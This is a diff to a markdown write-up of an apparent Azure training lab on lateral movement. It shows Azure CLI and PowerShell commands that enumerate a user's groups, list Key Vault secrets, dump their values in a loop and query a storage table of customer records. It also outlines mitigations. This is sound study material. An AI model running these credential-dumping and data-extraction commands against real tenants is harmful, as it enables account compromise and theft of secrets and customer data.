@@ -1,4 +1,5 @@
-Learn how attackers can leverage common services to move laterally in an Azure environment. You'll get hands-on experience with Azure Key Vault and Storage tables, understand what made this attack path possible and how it could have been prevented.
+*Learn how attackers can leverage common services to move laterally in an Azure environment. You'll get hands-on experience with Azure Key Vault and Storage tables, understand what made this attack path possible and how it could have been prevented.*
+
 ## Learning outcomes  
 
 - Familiarity with the Azure CLI and PowerShell
@@ -9,6 +10,7 @@ Learn how attackers can leverage common services to move laterally in an Azure e
 
 - The equivalent Azure CLI command for `whoami` is `az ad signed-in-user show`.
 1. We logged into the credentials from azure blob lab
+
 2. Went ahead and installed the Microsoft Graph to get user, subscription, etc. from the PowerShell.
 		`Install-Module Microsoft.Graph 
 		`Import-Module Microsoft.Graph.Users 
@@ -16,34 +18,34 @@ Learn how attackers can leverage common services to move laterally in an Azure e
 		`Install-Module Az 
 		`Import-Module Az 
 		`Connect-AzAccount
+
 3. To get which group a user is apart of run the `Get-MgUserMemberOf -userid "marcus@megabigtech.com" | select * -ExpandProperty additionalProperties | Select-Object {$_.AdditionalProperties["displayName"]}` command.
-		`Get-MgUserMemberOf` is a Microsoft Graph PowerShell cmdlet that retrieves these group memberships.
-		`$_`: Refers to the current object being processed.
-	    `AdditionalProperties["displayName"]`: Accesses the `displayName` property within the `AdditionalProperties` of the object.
-		`Select-Object`: Outputs only the `displayName` value for each item.
+
+- `Get-MgUserMemberOf` is a Microsoft Graph PowerShell cmdlet that retrieves these group memberships.
+
+- `$_`: Refers to the current object being processed.
+
+- `AdditionalProperties["displayName"]`: Accesses the `displayName` property within the `AdditionalProperties` of the object.
+
+- `Select-Object`: Outputs only the `displayName` value for each item.
+
 4. `az resource list` list the resources specified either in the subscription or resource group.
+
 5. `$secretsJson = az keyvault secret list --vault-name $VaultName -o json` Retrieves a  list of all secrets stored in the Azure Key Vault specified by the variable `$VaultName`. `-o json` outputs the list in JSON format.
 
-	`$secrets = $secretsJson | ConvertFrom-Json`. `ConvertFrom-Json` converts the JSON output into a PowerShell object for easier handling and then stored in a variable.
+- `$secrets = $secretsJson | ConvertFrom-Json`. `ConvertFrom-Json` converts the JSON output into a PowerShell object for easier handling and then stored in a variable.
 	
-	`$keysJson = az keyvault key list --vault-name $VaultName -o json ` - Retrieves a list of all cryptographic keys stored in the same Key Vault.
-	
-	$keys = $keysJson | ConvertFrom-Json 
+- `$keysJson = az keyvault key list --vault-name $VaultName -o json ` - Retrieves a list of all cryptographic keys stored in the same Key Vault.
 
-	`Write-Host "Secrets in vault $VaultName" 
-	`foreach ($secret in $secrets) { Write-Host $secret.id } 
-	# `Output the keys Write-Host "Keys in vault $VaultName" 
-	`foreach ($key in $keys) { Write-Host $key.id }`
-	
-	`Write-Host`: Displays text in the PowerShell console.
-	It loops through each item in `$secrets` and prints the `id` of each secret.
-	The `id` typically contains information about where the secret is located in Azure.
 6. Got the name of the secrets and want to get their values. Creating a list and giving it a variable `$SecretNames = @("alissa-suarez", "josh-harvey", "ryan-garcia")`
-	Then creating a for loop 
-	`Write-Host "Secret Values from vault $VaultName" 
-	`foreach ($SecretName in $SecretNames) { 
-		`$secretValueJson = az keyvault secret show --name $SecretName --vault-name $VaultName -o json 
-		`$secretValue = ($secretValueJson | ConvertFrom-Json).value Write-Host "$SecretName - $secretValue" }`
+	Then creating a for loop:
+
+	Write-Host "Secret Values from vault $VaultName"
+	foreach ($SecretName in $SecretNames) { 
+		$secretValueJson = az keyvault secret show --name $SecretName --vault-name $VaultName -o json 
+		$secretValue = ($secretValueJson | ConvertFrom-Json).value Write-Host "$SecretName - $secretValue" } 
+        ```
+
 7.  We want to see which contractor is active in the system. `az ad user list --query "[?givenName=='Alissa' || givenName=='Josh' || givenName=='Ryan'].{Name:displayName, UPN:userPrincipalName, JobTitle:jobTitle}" -o table`
 8. Getting the object ID helps with finding out which group they are a member of. `Get-MgUser -UserId ext.josh.harvey@megabigtech.com`
 	1. `$UserId = '6470f625-41ce-4233-a621-fad0aa0b7300'
@@ -53,11 +55,6 @@ Learn how attackers can leverage common services to move laterally in an Azure e
 12. `az storage account list --query "[].name" -o tsv` lists all storage accounts
 13. `az storage table list --account-name custdatabase --output table --auth-mode login` checks to see if there's a table in the storage account.
 14. `az storage entity query --table-name customers --account-name custdatabase --output table --auth-mode login` list all the data in that table.
-https://www.wiz.io/blog/38-terabytes-of-private-data-accidentally-exposed-by-microsoft-ai-researchers
-
-https://cybernews.com/security/circlek-leak-credit-card-exposed/
-
-This lab is an excellent scenario for understanding how attackers can leverage compromised accounts and weak security configurations in Azure environments. Below is a breakdown of the attack story:
 
 ---
 
@@ -132,9 +129,3 @@ This lab is an excellent scenario for understanding how attackers can leverage c
     
     - Conduct routine security assessments using tools like **Azure Security Center**.
     - Monitor resources for changes in configuration or access policies.
-
----
-
-### **Real-World Takeaways**
-
-This lab mirrors real-world risks where improper account management, excessive permissions, and weak security configurations combine to enable attackers to escalate privileges and exfiltrate sensitive data. By adopting a **zero-trust model**, minimizing access, and continuously monitoring the environment, such breaches can be mitigated.
